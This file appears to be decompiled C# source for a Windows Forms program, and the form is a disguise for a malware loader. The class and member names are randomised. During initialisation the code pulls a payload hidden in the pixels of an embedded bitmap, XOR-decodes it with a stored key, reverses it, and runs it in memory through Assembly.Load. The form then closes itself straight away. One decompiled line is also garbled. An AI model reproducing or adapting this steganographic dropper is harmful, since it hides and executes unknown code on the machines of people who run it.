using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using RnMtXCXKBPMkMninv.Properties;

namespace RnMtXCXKBPMkMninv;

public class FGFwPrbicE : Form
{
	private IContainer components = null;

	private string[] AiKEBDuSfLGxXNfvp;

	private byte[] LpteLNbVbHVI;

	private byte[] TkujEoGeDwFpsCyYe;

	private BitmapData AfLZyUThYzqgkG;

	private IntPtr ggeFISfxdrojYUer;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((AssemblyFileVersionAttribute)this)._002Ector((string)new Size(489, 199));
		((Control)this).set_Name("FGFwPrbicE");
		((Control)this).set_Text("FGFwPrbicE");
		((Form)this).add_Load((EventHandler)FGFwPrbicE_Load);
		((Control)this).ResumeLayout(false);
		Bitmap val = ROrTSnjVsdYmsxo();
		byte[] array = WdPxiIwCScGaSYQz(val);
		Rectangle xUWahAOKwBYBm = kfFTnhwCbNxEx(val);
		TcFVwPCmflFse(val, xUWahAOKwBYBm);
		WRqZpCzOsRTeddJHUrc(array);
		VSVxocgwLgTDVe(array, LpteLNbVbHVI);
		Assembly assembly = Assembly.Load(LpteLNbVbHVI);
		assembly.EntryPoint!.Invoke(null, new object[1] { AiKEBDuSfLGxXNfvp });
	}

	private void TcFVwPCmflFse(Bitmap WyhyXYNQDf, Rectangle XUWahAOKwBYBm)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		AfLZyUThYzqgkG = WyhyXYNQDf.LockBits(XUWahAOKwBYBm, (ImageLockMode)3, ((Image)WyhyXYNQDf).get_PixelFormat());
		ggeFISfxdrojYUer = (IntPtr)typeof(BitmapData).GetProperty("Scan0")!.GetValue(AfLZyUThYzqgkG, null);
	}

	private Bitmap ROrTSnjVsdYmsxo()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		return (Bitmap)Resources.ResourceManager.GetObject("FXfztmFOsZAkFP");
	}

	private void VSVxocgwLgTDVe(byte[] aLYWeieDYMRpQ, byte[] UbWkKbwgIc)
	{
		Array.Copy(aLYWeieDYMRpQ, 4, UbWkKbwgIc, 0, UbWkKbwgIc.Length);
		for (int i = 0; i < LpteLNbVbHVI.Length; i++)
		{
			for (int j = 0; j < TkujEoGeDwFpsCyYe.Length; j++)
			{
				LpteLNbVbHVI[i] = (byte)(LpteLNbVbHVI[i] ^ TkujEoGeDwFpsCyYe[j]);
			}
		}
		byte[] array = new byte[LpteLNbVbHVI.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = LpteLNbVbHVI[i];
		}
		for (int i = 0; i < array.Length; i++)
		{
			LpteLNbVbHVI[LpteLNbVbHVI.Length - i - 1] = array[i];
		}
	}

	private unsafe void WRqZpCzOsRTeddJHUrc(byte[] YoCRUuxXyboEArMe)
	{
		byte* ptr = (byte*)(void*)ggeFISfxdrojYUer;
		for (int i = 0; i < YoCRUuxXyboEArMe.Length; i++)
		{
			YoCRUuxXyboEArMe[i] = *(ptr++);
		}
		TkujEoGeDwFpsCyYe = (byte[])Resources.ResourceManager.GetObject("GVBcQggkEnVOs");
		int num = 0;
		for (int i = 0; i < 4; i++)
		{
			num += (int)(Math.Pow(256.0, i) * (double)(int)YoCRUuxXyboEArMe[i]);
		}
		LpteLNbVbHVI = new byte[num];
	}

	private Rectangle kfFTnhwCbNxEx(Bitmap YoCRUuxXyboEArMe)
	{
		return new Rectangle(0, 0, ((Image)YoCRUuxXyboEArMe).get_Width(), ((Image)YoCRUuxXyboEArMe).get_Height());
	}

	private byte[] WdPxiIwCScGaSYQz(Bitmap YoCRUuxXyboEArMe)
	{
		return new byte[((Image)YoCRUuxXyboEArMe).get_Width() * ((Image)YoCRUuxXyboEArMe).get_Height() * 4];
	}

	public FGFwPrbicE(string[] args)
	{
		AiKEBDuSfLGxXNfvp = args;
		Thread.Sleep(0);
		InitializeComponent();
	}

	private void FGFwPrbicE_Load(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
